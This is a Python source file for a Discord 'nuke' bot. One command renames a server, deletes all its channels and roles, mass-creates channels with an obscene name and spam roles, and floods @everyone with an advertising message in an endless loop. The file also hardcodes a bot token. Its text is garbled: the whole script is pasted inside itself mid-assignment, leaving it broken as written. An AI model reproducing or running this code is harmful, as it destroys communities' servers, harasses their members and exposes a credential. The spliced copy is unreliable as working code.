import os
import discord, threading, requests, time, random
from discord.ext import commands
from revive import keep_alive

intents = discord.Intents.default()
client = commands.Bot(command_prefix="!t",intents=intents)

tokenimport os
import discord, threading, requests, time, random
from discord.ext import commands
from revive import keep_alive

intents = discord.Intents.default()
client = commands.Bot(command_prefix="!t",intents=intents)

token = "MTA4NDE3NDY0MDE3NzQ5NjEyNA.G5NQgd.hMVKhgDBfghdET2qNGlCVpRywGB0yPHCU7-Un4"
headers = {"authorization": f"Bot {token}"}

msgtonuke = """
Nuked by Discordeum Trollus 
https://discord.gg/fgfURRukq5

@everyone
"""

colors = ["1752220","3066993","3447003","10181046","15277667","15844367","15105570","15158332","9807270","6323595"]

def removecha(cha):
    try:
        requests.delete(f"https://discord.com/api/v9/channels/{cha}", headers=headers)
        print(f"Deleted Channel: {cha}")
    except:
        pass

def removerole(role, guild):
    try:
        requests.delete(f"https://discord.com/api/v9/guilds/{guild}/roles/{role}",headers=headers)
        print(f"Deleted Role: {role}")
    except:
        pass

def spamchat(guild):
    json_data = {"name": f"raped-by-dt"}
    try:
        requests.post(f"https://discord.com/api/v9/guilds/{guild}/channels",headers=headers,json=json_data)
        print(f"Spammed Channel")
    except:
        pass

def spamrole(guild):
    json = {"name": f"trolled", "color": random.choice(colors)}
    try:
        requests.post(f"https://discord.com/api/v9/guilds/{guild}/roles",headers=headers,json=json)
        print(f"Spammed Role")
    except:
        pass

@client.event
async def on_ready():
    print(f"ready to nuke\nPrefix is {client.command_prefix}")
    await client.change_presence(activity=discord.Streaming(name="My prefix is !t | 10 Server(s)", url="https://twitch.tv/#"))

@client.command()
async def nuke(ctx):
    with open("troll.png", "rb") as f:
        icon = f.read()
    await ctx.guild.edit(name="Nuked by Discordeum Trollus", icon=icon)
    for channel in ctx.guild.channels:
        threading.Thread(target=removecha, args=(channel.id,)).start()
    for role in ctx.guild.roles:
        threading.Thread(target=removerole, args=(role.id, ctx.guild.id,)).start()
    for i in range(40):
        threading.Thread(target=spamchat, args=(ctx.guild.id,)).start()
    for i in range(50):
        threading.Thread(target=spamrole, args=(ctx.guild.id,)).start()

@client.event
async def on_guild_channel_create(channel):
    while True:
        await channel.send(msgtonuke)
    
keep_alive()
client.run(token) = "MTA4NDE3NDY0MDE3NzQ5NjEyNA.G5NQgd.hMVKhgDBfghdET2qNGlCVpRywGB0yPHCU7-Un4"
headers = {"authorization": f"Bot {token}"}

msgtonuke = """
Nuked by Discordeum Trollus 
https://discord.gg/fgfURRukq5

@everyone
"""

colors = ["1752220","3066993","3447003","10181046","15277667","15844367","15105570","15158332","9807270","6323595"]

def removecha(cha):
    try:
        requests.delete(f"https://discord.com/api/v9/channels/{cha}", headers=headers)
        print(f"Deleted Channel: {cha}")
    except:
        pass

def removerole(role, guild):
    try:
        requests.delete(f"https://discord.com/api/v9/guilds/{guild}/roles/{role}",headers=headers)
        print(f"Deleted Role: {role}")
    except:
        pass

def spamchat(guild):
    json_data = {"name": f"raped-by-dt"}
    try:
        requests.post(f"https://discord.com/api/v9/guilds/{guild}/channels",headers=headers,json=json_data)
        print(f"Spammed Channel")
    except:
        pass

def spamrole(guild):
    json = {"name": f"trolled", "color": random.choice(colors)}
    try:
        requests.post(f"https://discord.com/api/v9/guilds/{guild}/roles",headers=headers,json=json)
        print(f"Spammed Role")
    except:
        pass

@client.event
async def on_ready():
    print(f"ready to nuke\nPrefix is {client.command_prefix}")
    await client.change_presence(activity=discord.Streaming(name="My prefix is !t | 10 Server(s)", url="https://twitch.tv/#"))

@client.command()
async def nuke(ctx):
    with open("troll.png", "rb") as f:
        icon = f.read()
    await ctx.guild.edit(name="Nuked by Discordeum Trollus", icon=icon)
    for channel in ctx.guild.channels:
        threading.Thread(target=removecha, args=(channel.id,)).start()
    for role in ctx.guild.roles:
        threading.Thread(target=removerole, args=(role.id, ctx.guild.id,)).start()
    for i in range(40):
        threading.Thread(target=spamchat, args=(ctx.guild.id,)).start()
    for i in range(50):
        threading.Thread(target=spamrole, args=(ctx.guild.id,)).start()

@client.event
async def on_guild_channel_create(channel):
    while True:
        await channel.send(msgtonuke)
    
keep_alive()
client.run(token)
